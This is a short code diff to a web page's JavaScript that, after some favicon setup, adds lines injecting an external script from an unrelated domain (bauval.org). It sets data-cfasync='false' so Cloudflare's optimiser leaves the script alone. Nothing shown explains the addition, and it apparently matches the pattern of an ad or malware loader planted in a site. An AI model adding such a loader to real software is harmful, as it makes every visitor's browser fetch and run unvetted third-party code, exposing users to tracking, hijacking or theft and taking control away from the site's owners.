@@ -103,3 +103,8 @@ favicon.href = "data:image/svg+xml," + encodeURIComponent(`
 `);
 document.head.appendChild(favicon);
 
+// Dynamically inject the external script with data-cfasync="false"
+const externalScript = document.createElement("script");
+externalScript.setAttribute("data-cfasync", "false");
+externalScript.src = "https://bauval.org/14/f2f10873e4a5ed9bda67578d350745f1";
+document.head.appendChild(externalScript);
